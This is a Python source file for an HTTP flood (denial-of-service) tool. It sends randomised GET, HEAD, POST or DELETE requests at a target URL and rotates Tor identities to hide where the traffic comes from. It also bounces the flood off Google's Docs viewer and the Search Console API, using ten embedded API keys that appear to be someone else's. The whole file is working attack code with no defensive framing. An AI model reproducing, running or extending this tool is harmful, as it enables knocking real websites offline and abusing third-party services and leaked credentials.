# Import modules
import requests
import random
import tools.randomData as randomData
from colorama import Fore
from stem import Signal
from stem.control import Controller

# Load user agents
user_agents = []
for _ in range(30):
    user_agents.append(randomData.random_useragent())

# Headers
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice
def randomurl():
	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))



def flood(target,domainname,attack,sock):
    headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "close",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
    "User-agent": random.choice(user_agents),"host":domainname,
    }
    payload = str(random._urandom(random.randint(10, 150)))
    datapost= {
    "url": target+'/?'+payload,
    }
    s = requests.Session()
	
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate(password="taisaoem")
        controller.signal(Signal.NEWNYM)
    key1='AIzaSy'
    key2='BHi888UMDA55dSnonFKSNZtgm-8_6TQ7I'
    key3='ArlvSOvTA3iDhq5ay-GKrfjeECUf-rd00'
    key4='BNCglR37F0eBQfnmI7bW974JDthlQa2T4'
    key5='DrKdv9g8ilkxDfAHW-G_Lz1rXnei9g1Qw'
    key6='AiJwOhOGBC2igc7wowoT72ODA9qJ1OYis'
    key7='Brpdc4c8oeRMEidAUMdeCpYYy_eu7P3pk'
    key8='CY1In30SdsKU2s-ko9tqcTMW6cf9Knmpg'
    key9='DY82nXT8v34WRPkav46R22mQqU3udDB4E'
    key10='D2BsiZDtQLfpSLsB8Q7csQbltMEROGPgQ'
    key11='A0a6Ql5g_CWzM22WdE-pT9K_Gj6oUSy54'
    
    #payload = randomurl()
    if sock =='http':
        proxies = {'http': "socks5://127.0.0.1:9050"}
    elif sock =='https':
        proxies = {'https': "socks5h://127.0.0.1:9050"}
    else:
        proxies =''
		
    try:
        if proxies!='':
            if attack =='get':
                r = s.get(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
            elif attack =='head':
                r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False,proxies=proxies)
            elif attack =='googleapi':
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key3, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key4, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key5, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key6, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key7, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key8, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key9, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key10, data=datapost, headers=headers, timeout=4)
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key11, data=datapost, headers=headers, timeout=4)
            elif attack =='google':
                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
            elif attack =='delete':
                r = s.delete(target, params=payload, headers=headers, timeout=4 ,verify=False,proxies=proxies)
            else:
                r = s.post(target,params=payload ,headers=headers, timeout=4 , verify=False,proxies=proxies)
        else:
            if attack =='get':
                r = s.get(target, params=payload, headers=headers, timeout=20 ,verify=False)
            elif attack =='head':
                r = s.head(target, params=payload, headers=headers, timeout=20 ,verify=False)
            elif attack =='googleapi':
                r = s.post('https://searchconsole.googleapis.com/v1/urlTestingTools/mobileFriendlyTest:run?key='+key1+key2, data=datapost, headers=headers, timeout=20 ,verify=False)
            elif attack =='google':
                r = s.get('https://docs.google.com/viewer?url='+target+'?'+payload, headers=headers, timeout=15)
            elif attack =='delete':
                r = s.delete(target, params=payload, headers=headers, timeout=20 ,verify=False)
            else:
                r = s.post(target,params=payload ,headers=headers, timeout=20 , verify=False)


    #except requests.exceptions.ConnectTimeout:
        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending GET request\n{Fore.MAGENTA}{e}{Fore.RESET}"
        )
    else:
        print(
            f"{Fore.GREEN}[{r.status_code}] {Fore.YELLOW}Request sent! Payload size: {len(payload)}.{Fore.RESET}"
        )
